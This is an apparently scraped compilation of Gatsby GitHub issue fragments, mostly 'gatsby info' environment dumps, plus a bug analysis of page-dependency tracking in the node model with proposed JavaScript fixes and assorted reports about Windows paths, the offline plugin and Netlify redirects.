system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: yarn: 1.19.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.11.3 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.16 browsers: edge: 44.18362.387.0 npmpackages: gatsby: ^2.15.36 => 2.15.36 gatsby-source-filesystem: ^2.1.31 => 2.1.31 gatsby-transformer-yaml: ^2.2.13 => 2.2.13 ### possible cause i've taken a look at [/schema/node-model.js]( and [this pr]( and i think i see what's happened
the node model methods that can add page dependencies are supposed to automatically get the path from context and add it to page dependencies
this was done in `localnodemodel.trackpagedependencies` which is used by all other methods that add page dependencies
```js // localnodemodel.trackpagedependencies before materialization changes
trackpagedependencies(result, pagedependencies) { const fulldependencies = { path: this.path, ...(pagedependencies || {}), } const { path, connectiontype } = fulldependencies if (path) { // add page dependency ..
} return result
``` the problem is the code that automatically adds the path has been moved to **contextual**nodemodel.trackpagedependencies
// localnodemodel
trackpagedependencies(result, pagedependencies = {}) { const { path, connectiontype } = pagedependencies if (path) { // the path is never automatically added so if it's not added manually nothing happens // add page dependency ..
} return result
} // contextualnodemodel
trackpagedependencies(result, pagedependencies) { const fulldependencies = { path: this.context.path, ...(pagedependencies || {}), } return this.nodemodel.trackpagedependencies(result, fulldependencies)
``` all other methods in **contextual**nodemodel are simply a wrapper for **local**nodemodel
so when you call a context.nodemodel method from a resolver the **local**nodemodel method is called which then calls **local**nodemodel.trackpagedependencies which is no longer setting the path automatically and thus does nothing if the path is not given
calling context.nodemodel.trackpagedependencies from a resolver does work as expected because it is **contextual**nodemodel.trackpagedependencies, which does set the path
### possible solutions i've experimented a bit with a local copy of gatsby and got the following solutions to work: the obvious thing to do is simply put code similar to **contextual**nodemodel.trackpagedependencies that adds the path to `pagedependencies` in all **contextual**nodemodel methods that can add page dependencies
while this works it doesn't seem ideal as it could easily be missed out if new methods are added in the future
class contextualnodemodel { ..
_getfulldependencies(pagedependencies) { return { path: this.context.path, ...(pagedependencies || {}) }; } getallnodes(args, pagedependencies) { // make sure page dependencies are not added if none are passed const fulldependencies = !pagedependencies ? null : _getfulldependencies(pagedependencies); return this.nodemodel.getallnodes(args, fulldependencies); } runquery(args, pagedependencies) { return this.nodemodel.runquery( args, _getfulldependencies(pagedependencies) ); } ...
``` my other idea was to replace the `trackpagedependencies` of the referenced **local**nodemodel in the constructor of **contextual**nodemodel
so that methods run from a **contextual**nodemodel will always call a version of `trackpagedependencies` that adds the path
i'm not super experienced with javascript nor very familiar with the gatsby code base, so i don't know if this is a good idea
class contextualnodemodel { constructor(rootnodemodel, context) { this.nodemodel = rootnodemodel; this.context = context; const roottrackpagedependencies = rootnodemodel.trackpagedependencies.bind( rootnodemodel ); this.nodemodel.trackpagedependencies = function( result, pagedependencies ) { const fulldependencies = { path: context.path, ...(pagedependencies || {}) }; return roottrackpagedependencies(result, fulldependencies); }; } ...
``` would be happy to make a pr but will wait for feedback on this first.
```sh system: os: linux 4.4 ubuntu 18.04.2 lts (bionic beaver) cpu: (16) x64 amd ryzen 7 1700x eight-core processor shell: 4.4.19 - /bin/bash binaries: node: 10.15.1 - ~/.nvm/versions/node/v10.15.1/bin/node yarn: 1.17.3 - /usr/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.1/bin/npm npmpackages: gatsby: ^2.15.17 => 2.15.17 gatsby-image: ^2.2.19 => 2.2.19 gatsby-plugin-create-client-paths: ^2.1.8 => 2.1.8 gatsby-plugin-emotion: ^4.1.6 => 4.1.6 gatsby-plugin-gtag: ^1.0.11 => 1.0.11 gatsby-plugin-layout: ^1.1.7 => 1.1.7 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-netlify: ^2.1.13 => 2.1.13 gatsby-plugin-netlify-headers: ^1.0.1 => 1.0.1 gatsby-plugin-offline: ^3.0.7 => 3.0.7 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-sharp: ^2.2.23 => 2.2.23 gatsby-plugin-typescript: ^2.1.8 => 2.1.8 gatsby-source-filesystem: ^2.1.23 => 2.1.23 npmglobalpackages: gatsby-cli: 2.5.7
$ gatsby info --clipboard
``` system: os: linux 4.15 pop!_os 18.04 lts cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 4.4.20 - /bin/bash languages: python: 2.7.15+ - /usr/bin/python browsers: chrome: 77.0.3865.90 firefox: 69.0.1 npmpackages: gatsby: ^2.15.35 => 2.15.35 gatsby-image: ^2.2.27 => 2.2.27 gatsby-plugin-manifest: ^2.2.21 => 2.2.21 gatsby-plugin-offline: ^3.0.14 => 3.0.14 gatsby-plugin-react-helmet: ^3.1.11 => 3.1.11 gatsby-plugin-sharp: ^2.2.29 => 2.2.29 gatsby-source-filesystem: ^2.1.31 => 2.1.31 gatsby-transformer-sharp: ^2.2.21 => 2.2.21
system: os: macos 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.11.1 - ~/.nvm/versions/node/v12.11.1/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v12.11.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.90 firefox: 69.0.2 safari: 13.0.2
system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 10.12.0 - ~/.nvm/versions/node/v10.12.0/bin/node npm: 6.4.1 - ~/.nvm/versions/node/v10.12.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 77.0.3865.90 firefox: 68.0.2 safari: 13.0.1 npmpackages: gatsby: 2.15.0 => 2.15.0 gatsby-image: ^2.2.24 => 2.2.24 gatsby-plugin-manifest: ^2.2.20 => 2.2.20 gatsby-plugin-offline: ^3.0.11 => 3.0.11 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.10 gatsby-plugin-sharp: ^2.2.28 => 2.2.28 gatsby-source-filesystem: ^2.1.29 => 2.1.29 gatsby-transformer-json: 2.2.12 => 2.2.12 gatsby-transformer-sharp: ^2.2.20 => 2.2.20
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-6920hq cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 12.10.0 - /usr/local/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.90 firefox: 60.9.0 safari: 13.0.1 npmglobalpackages: gatsby-cli: 2.7.30
``` npmpackages: gatsby: 2.15.28 => 2.15.28 gatsby-image: ^2.0.37 => 2.2.23 gatsby-plugin-catch-links: ^2.0.10 => 2.1.12 gatsby-plugin-google-tagmanager: ^2.0.13 => 2.1.12 gatsby-plugin-mdx: 1.0.40 => 1.0.40 gatsby-plugin-react-helmet: ^3.0.6 => 3.1.10 gatsby-plugin-react-svg: ^2.0.0-beta1 => 2.1.2 gatsby-plugin-schema-snapshot: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.0.0 => 2.2.27 gatsby-plugin-styled-components: ^3.0.5 => 3.1.8 gatsby-plugin-typescript: ^2.0.0 => 2.1.11 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-remark-autolink-headers: ^2.0.0 => 2.1.13 gatsby-remark-copy-linked-files: ^2.1.0 => 2.1.23 gatsby-remark-embed-youtube: ^0.0.7 => 0.0.7 gatsby-remark-images: 3.1.2 => 3.1.2 gatsby-remark-lazy-load: ^1.0.1 => 1.0.2 gatsby-remark-prismjs: ^3.0.0 => 3.3.16 gatsby-source-filesystem: 2.0.39 => 2.0.39 gatsby-transformer-json: ^2.1.11 => 2.2.11 gatsby-transformer-sharp: ^2.1.1 => 2.2.19
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh
binaries: node: 12.10.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm
languages: python: 2.7.10 - /usr/bin/python
browsers: chrome: 76.0.3809.87 firefox: 68.0.2 safari: 13.0.1
npmpackages: gatsby: 2.15.26 => 2.15.26 gatsby-image: 2.2.21 => 2.2.21 gatsby-plugin-algolia: ^0.3.4 => 0.3.4 gatsby-plugin-catch-links: 2.1.10 => 2.1.10 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-analytics: 2.1.17 => 2.1.17 gatsby-plugin-lodash: ^3.1.7 => 3.1.8 gatsby-plugin-manifest: 2.2.18 => 2.2.18 gatsby-plugin-mdx: ^1.0.42 => 1.0.44 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: 3.0.9 => 3.0.9 gatsby-plugin-react-helmet: 3.1.8 => 3.1.8 gatsby-plugin-sharp: 2.2.25 => 2.2.25 gatsby-plugin-styled-components: 3.1.6 => 3.1.6 gatsby-remark-autolink-headers: ^2.1.10 => 2.1.11 gatsby-remark-code-titles: ^1.1.0 => 1.1.0 gatsby-remark-copy-linked-files: ^2.1.19 => 2.1.21 gatsby-remark-embed-video: 2.0.0 => 2.0.0 gatsby-remark-emojis: ^0.3.2 => 0.3.2 gatsby-remark-images: 3.1.23 => 3.1.23 gatsby-remark-katex: ^3.1.8 => 3.1.10 gatsby-remark-responsive-iframe: 2.2.18 => 2.2.18 gatsby-remark-smartypants: 2.1.9 => 2.1.9 gatsby-remark-sub-sup: ^1.0.0 => 1.0.0 gatsby-remark-vscode: ^1.2.1 => 1.2.1 gatsby-source-filesystem: 2.1.26 => 2.1.26 gatsby-transformer-sharp: 2.2.17 => 2.2.17 gatsby-transformer-yaml: 2.2.10 => 2.2.10 ```
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.90 firefox: 68.0.2 safari: 13.0.1 npmpackages: gatsby: ^2.13.18 => 2.15.24 gatsby-image: ^2.0.33 => 2.2.21 gatsby-plugin-feed: ^2.0.15 => 2.3.13 gatsby-plugin-google-analytics: ^2.1.7 => 2.1.17 gatsby-plugin-manifest: ^2.0.24 => 2.2.18 gatsby-plugin-mdx: ^1.0.39 => 1.0.44 gatsby-plugin-react-helmet: ^3.0.9 => 3.1.8 gatsby-plugin-sharp: ^2.2.6 => 2.2.25 gatsby-plugin-sitemap: ^2.2.12 => 2.2.14 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-autolink-headers: ^2.1.13 => 2.1.13 gatsby-remark-copy-linked-files: ^2.1.6 => 2.1.21 gatsby-remark-embed-markdown: 0.0.4 => 0.0.4 gatsby-remark-embed-video: ^1.7.1 => 1.7.1 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-github: ^2.0.0 => 2.0.0 gatsby-remark-heading-slug: ^0.2.0 => 0.2.0 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-prismjs: ^3.2.5 => 3.3.14 gatsby-remark-responsive-iframe: ^2.0.10 => 2.2.18 gatsby-remark-static-images: ^1.1.0 => 1.1.0 gatsby-source-filesystem: ^2.1.5 => 2.1.26 gatsby-transformer-json: ^2.1.11 => 2.2.9 gatsby-transformer-remark: ^2.3.2 => 2.6.24 gatsby-transformer-sharp: ^2.1.17 => 2.2.17 gatsby-transformer-yaml: ^2.1.10 => 2.2.10 npmglobalpackages: gatsby-cli: 2.7.7
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 77.0.3865.90 firefox: 69.0.1 safari: 13.0.1 npmpackages: gatsby: ^2.15.28 => 2.15.28 gatsby-image: ^2.2.23 => 2.2.23 gatsby-plugin-canonical-urls: ^2.1.10 => 2.1.10 gatsby-plugin-catch-links: ^2.1.12 => 2.1.12 gatsby-plugin-humans-txt: ^1.1.4 => 1.1.4 gatsby-plugin-layout: ^1.1.10 => 1.1.10 gatsby-plugin-manifest: ^2.2.20 => 2.2.20 gatsby-plugin-postcss: ^2.1.10 => 2.1.10 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.10 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.17 => 2.1.17 gatsby-plugin-sharp: ^2.2.27 => 2.2.27 gatsby-plugin-sitemap: ^2.2.16 => 2.2.16 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-remark-emoji: 0.0.3 => 0.0.3 gatsby-remark-images: ^3.1.25 => 3.1.25 gatsby-remark-prismjs: ^3.3.16 => 3.3.16 gatsby-source-filesystem: ^2.1.28 => 2.1.28 gatsby-transformer-json: ^2.2.11 => 2.2.11 gatsby-transformer-remark: ^2.6.26 => 2.6.26 gatsby-transformer-sharp: ^2.2.19 => 2.2.19 npmglobalpackages: gatsby-cli: 2.7.50
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4960hq cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.9.0 - ~/.nvm/versions/node/v12.9.0/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.10.2 - ~/.nvm/versions/node/v12.9.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 77.0.3865.90 firefox: 69.0 safari: 13.0.1
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - /var/folders/jn/3z685bls0mv64x4q1vjrzgy40000gn/t/yarn--1569592481666-0.7159453631127595/node yarn: 1.17.3 - /var/folders/jn/3z685bls0mv64x4q1vjrzgy40000gn/t/yarn--1569592481666-0.7159453631127595/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.90 firefox: 67.0.4 safari: 12.1.1 npmpackages: gatsby: ^2.13.50 => 2.13.50 gatsby-image: ^2.2.8 => 2.2.8 gatsby-plugin-manifest: ^2.2.4 => 2.2.4 gatsby-plugin-mdx: ^1.0.46 => 1.0.46 gatsby-plugin-offline: ^2.2.4 => 2.2.4 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.3 gatsby-plugin-sharp: ^2.2.9 => 2.2.9 gatsby-source-filesystem: ^2.1.8 => 2.1.8 gatsby-transformer-sharp: ^2.2.5 => 2.2.5
bailey:~/environment/gatsby-error (master) $ gatsby info system: os: linux 4.14 amazon linux ami 2018.03 cpu: (2) x64 intel(r) xeon(r) platinum 8175m cpu @ 2.50ghz shell: 4.2.46 - /bin/bash binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node npm: 6.11.3 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: ^2.15.28 => 2.15.28 gatsby-plugin-offline: ^3.0.11 => 3.0.11 npmglobalpackages: gatsby-cli: 2.7.53 bailey:~/environment/gatsby-error (master) $ ```
``` system: os: macos 10.15 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 11.15.0 - ~/.nvm/versions/node/v11.15.0/bin/node yarn: 1.17.3 - ~/.nvm/versions/node/v11.15.0/bin/yarn npm: 6.7.0 - ~/.nvm/versions/node/v11.15.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 77.0.3865.90 safari: 13.0.1 npmpackages: gatsby-plugin-svgr: ^2.0.2 => 2.0.2 ``` here's a chrome cpu profile that shows a tiny part of this - i stopped it after a bit to keep file size down, but the profile would just continue like this for 40 minutes
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.90 firefox: 69.0.1 safari: 13.0.1 npmpackages: gatsby: ^2.13.71 => 2.15.21 gatsby-source-filesystem: ^2.0.37 => 2.1.26
``` | => gatsby info --clipboard system: os: macos 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 12.4.0 - /usr/local/bin/node npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.90 safari: 13.0.1 npmpackages: gatsby: ^2.15.24 => 2.15.24 gatsby-cli: ^2.7.50 => 2.7.50 gatsby-image: ^2.2.21 => 2.2.21 gatsby-plugin-algolia: ^0.3.4 => 0.3.4 gatsby-plugin-create-client-paths: ^2.1.9 => 2.1.9 gatsby-plugin-eslint: ^2.0.5 => 2.0.5 gatsby-plugin-manifest: ^2.2.18 => 2.2.18 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-netlify: ^2.1.15 => 2.1.15 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^3.0.9 => 3.0.9 gatsby-plugin-react-helmet: ^3.1.8 => 3.1.8 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.2.25 => 2.2.25 gatsby-plugin-styled-components: ^3.1.6 => 3.1.6 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-drupal: ^3.2.31 => 3.2.31 gatsby-source-filesystem: ^2.1.26 => 2.1.26 gatsby-transformer-sharp: ^2.2.17 => 2.2.17 gatsby-transformer-sqip: ^2.1.28 => 2.1.28 ```
system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.90 firefox: 69.0 safari: 13.0 npmpackages: gatsby: ^2.15.23 => 2.15.23 gatsby-image: ^2.2.21 => 2.2.21 gatsby-plugin-manifest: ^2.2.18 => 2.2.18 gatsby-plugin-mdx: ^1.0.44 => 1.0.44 gatsby-plugin-offline: ^3.0.9 => 3.0.9 gatsby-plugin-react-helmet: ^3.1.8 => 3.1.8 gatsby-plugin-sharp: ^2.2.25 => 2.2.25 gatsby-source-contentful: ^2.1.42 => 2.1.42 gatsby-source-filesystem: ^2.1.26 => 2.1.26 gatsby-transformer-remark: ^2.6.24 => 2.6.24 gatsby-transformer-sharp: ^2.2.17 => 2.2.17 npmglobalpackages: gatsby-cli: 2.7.49
system: os: linux 4.15 ubuntu 18.04.3 lts (bionic beaver) cpu: (2) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz shell: 4.4.20 - /bin/bash binaries: node: 12.10.0 - ~/.nvm/versions/node/v12.10.0/bin/node yarn: 1.17.3 - ~/.nvm/versions/node/v12.10.0/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v12.10.0/bin/npm languages: python: 3.7.3 - /home/paul/.pyenv/shims/python browsers: chrome: 77.0.3865.90 firefox: 69.0 npmpackages: gatsby: ^2.15.22 => 2.15.22 gatsby-image: ^2.2.21 => 2.2.21 gatsby-plugin-feed: ^2.3.13 => 2.3.13 gatsby-plugin-google-analytics: ^2.1.17 => 2.1.17 gatsby-plugin-manifest: ^2.2.18 => 2.2.18 gatsby-plugin-offline: ^3.0.8 => 3.0.8 gatsby-plugin-react-helmet: ^3.1.8 => 3.1.8 gatsby-plugin-sharp: ^2.2.25 => 2.2.25 gatsby-plugin-typography: ^2.3.8 => 2.3.8 gatsby-remark-copy-linked-files: ^2.1.21 => 2.1.21 gatsby-remark-images: ^3.1.23 => 3.1.23 gatsby-remark-prismjs: ^3.3.14 => 3.3.14 gatsby-remark-responsive-iframe: ^2.2.18 => 2.2.18 gatsby-remark-smartypants: ^2.1.9 => 2.1.9 gatsby-source-filesystem: ^2.1.26 => 2.1.26 gatsby-transformer-remark: ^2.6.24 => 2.6.24 gatsby-transformer-sharp: ^2.2.17 => 2.2.17 npmglobalpackages: gatsby-dev-cli: 2.5.25
n/a - this is a bug in the production www page.
system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz binaries: node: 12.1.0 - d:\\software\ odejs\ ode.exe yarn: 1.17.3 - d:\\software\\yarn\\bin\\yarn.cmd npm: 6.9.0 - d:\\software\ odejs\ pm.cmd languages: python: 2.7.15 - /c/users/xxxxxx/.windows-build-tools/python27/python browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.13.12 => 2.13.12 gatsby-image: ^2.2.4 => 2.2.4 gatsby-plugin-emotion: ^4.1.2 => 4.1.2 gatsby-plugin-manifest: ^2.2.1 => 2.2.1 gatsby-plugin-mdx: ^1.0.11 => 1.0.11 gatsby-plugin-offline: ^2.2.1 => 2.2.1 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0 gatsby-plugin-sharp: ^2.2.3 => 2.2.3 gatsby-plugin-typography: ^2.3.3 => 2.3.3 gatsby-remark-embed-snippet: ^4.1.2 => 4.1.2 gatsby-remark-emoji: ^0.0.3 => 0.0.3 gatsby-remark-images: ^3.1.3 => 3.1.3 gatsby-remark-prismjs: ^3.3.5 => 3.3.5 gatsby-source-filesystem: ^2.1.3 => 2.1.3 gatsby-transformer-remark: ^2.6.14 => 2.6.14 gatsby-transformer-sharp: ^2.2.1 => 2.2.1
e:\ epos\\grumpyv2\\gatsby-starter-blog-mdx>gatsby info --clipboard system: os: windows 10 cpu: (16) x64 amd ryzen 7 2700x eight-core processor binaries: npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.16 browsers: edge: 44.18362.329.0 npmpackages: gatsby: ^2.14.4 => 2.15.20 gatsby-image: ^2.0.22 => 2.2.20 gatsby-plugin-feed: ^2.0.8 => 2.3.13 gatsby-plugin-google-analytics: ^2.0.5 => 2.1.17 gatsby-plugin-manifest: ^2.0.5 => 2.2.18 gatsby-plugin-mdx: ^1.0.33 => 1.0.43 gatsby-plugin-offline: ^2.0.5 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.1.8 gatsby-plugin-sharp: ^2.0.6 => 2.2.25 gatsby-plugin-typography: ^2.2.0 => 2.3.8 gatsby-remark-copy-linked-files: ^2.0.5 => 2.1.20 gatsby-remark-images: ^3.1.19 => 3.1.23 gatsby-remark-responsive-iframe: ^2.0.5 => 2.2.17 gatsby-remark-smartypants: ^2.0.5 => 2.1.9 gatsby-source-filesystem: ^2.0.2 => 2.1.26 gatsby-transformer-remark: ^2.1.6 => 2.6.24 gatsby-transformer-sharp: ^2.1.3 => 2.2.16
``` ### thoughts on fixes we should be able to just make this go away - someone's got to be using a non-windows-enlightened path manipulation library somewhere
barring that, at least raise a more useful error message
this wasted three hours of my life yesterday and it's a pretty popular issue judging from google (even since february when we last tried to fix it).
netlify and local: local info: ``` system: os: linux 5.3 arch linux undefined cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.10.0 - /usr/bin/node yarn: 1.17.3 - /usr/bin/yarn npm: 6.11.3 - /usr/bin/npm languages: python: 3.7.4 - /usr/bin/python npmglobalpackages: gatsby-cli: 2.7.7
** system: os: macos 10.14.6 cpu: x64 intel(r) core(tm) i7-7660u cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 8.12.0 - /usr/local/bin/node yarn: 1.12.1 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 77.0.3865.90 firefox: 65.0.1 safari: 12.1.2 npmpackages: gatsby: ^2.13.67 => 2.15.14 gatsby-image: ^2.2.3 => 2.2.18 gatsby-plugin-catch-links: ^2.1.0 => 2.1.9 gatsby-plugin-emotion: ^4.1.0 => 4.1.2 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-analytics: ^2.1.1 => 2.1.16 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.0 => 2.2.16 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.7 gatsby-plugin-sharp: ^2.2.1 => 2.2.7 gatsby-remark-copy-linked-files: ^2.1.0 => 2.1.3 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-figure-caption: ^2.0.0 => 2.0.0 gatsby-remark-images: ^3.1.12 => 3.1.12 gatsby-remark-images-medium-zoom: ^1.2.1 => 1.2.1 gatsby-source-filesystem: ^2.1.1 => 2.1.5 gatsby-source-prismic: ^2.2.0 => 2.2.0 gatsby-transformer-remark: ^2.6.19 => 2.6.19 gatsby-transformer-sharp: ^2.2.0 => 2.2.3 npmglobalpackages: gatsby-cli: 2.4.3
system: os: windows 10 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz binaries: npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.15.15 => 2.15.15 gatsby-cli: ^2.7.47 => 2.7.47 gatsby-image: ^2.2.19 => 2.2.19 gatsby-plugin-env-variables: ^1.0.1 => 1.0.1 gatsby-plugin-google-tagmanager: ^2.1.9 => 2.1.9 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-offline: ^3.0.6 => 3.0.6 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.14 => 2.1.14 gatsby-plugin-sharp: ^2.2.22 => 2.2.22 gatsby-plugin-sitemap: ^2.2.12 => 2.2.12 gatsby-plugin-stripe: ^1.2.3 => 1.2.3 gatsby-source-filesystem: ^2.1.22 => 2.1.22 gatsby-source-wordpress: ^3.1.31 => 3.1.31 gatsby-transformer-remark: ^2.6.22 => 2.6.22 gatsby-transformer-sharp: ^2.2.14 => 2.2.14 **update**
i moved around some css imports and this page seems to work fine now.
but now i get white flashes every time i change pages unless im incognito.
i also get his error:
sw.js:formatted:63 uncaught typeerror: messageapi[gatsbyapi] is not a function at sw.js:formatted:63
but only if i load the page without the console open..
sooo weird.
it seems like the gatsby offline plugin is definitely doing something weird.
``` system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - /usr/local/bin/node npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.132 safari: 12.1.2 npmpackages: gatsby: 2.15.16 => 2.15.16 gatsby-image: 2.2.19 => 2.2.19 gatsby-plugin-emotion: 4.1.6 => 4.1.6 gatsby-plugin-feed: 2.3.12 => 2.3.12 gatsby-plugin-google-analytics: 2.1.16 => 2.1.16 gatsby-plugin-offline: 3.0.7 => 3.0.7 gatsby-plugin-page-creator: 2.1.17 => 2.1.17 gatsby-plugin-react-helmet: 3.1.7 => 3.1.7 gatsby-plugin-sharp: 2.2.22 => 2.2.22 gatsby-plugin-svgr: 2.0.2 => 2.0.2 gatsby-plugin-twitter: 2.1.6 => 2.1.6 gatsby-plugin-typescript: 2.1.8 => 2.1.8 gatsby-plugin-typography: 2.3.7 => 2.3.7 gatsby-remark-autolink-headers: 2.1.10 => 2.1.10 gatsby-remark-copy-linked-files: 2.1.19 => 2.1.19 gatsby-remark-emojis: 0.3.2 => 0.3.2 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: 3.1.22 => 3.1.22 gatsby-remark-prismjs: 3.3.13 => 3.3.13 gatsby-remark-responsive-iframe: 2.2.16 => 2.2.16 gatsby-remark-smartypants: 2.1.8 => 2.1.8 gatsby-source-filesystem: 2.1.22 => 2.1.22 gatsby-transformer-remark: 2.6.22 => 2.6.22 gatsby-transformer-sharp: 2.2.14 => 2.2.14 npmglobalpackages: gatsby-cli: 2.7.47
``` react ```
react: 16.9.0
react-dom: 16.9.0
i'm running gatsby v1 on the old site, and gatsby v2 on the new site
so naturally i looked at the v1 docs since i'm setting up the redirects there, but it's the same info
it tell me to make sure gatsby-plugin-netlify is at the end of the array
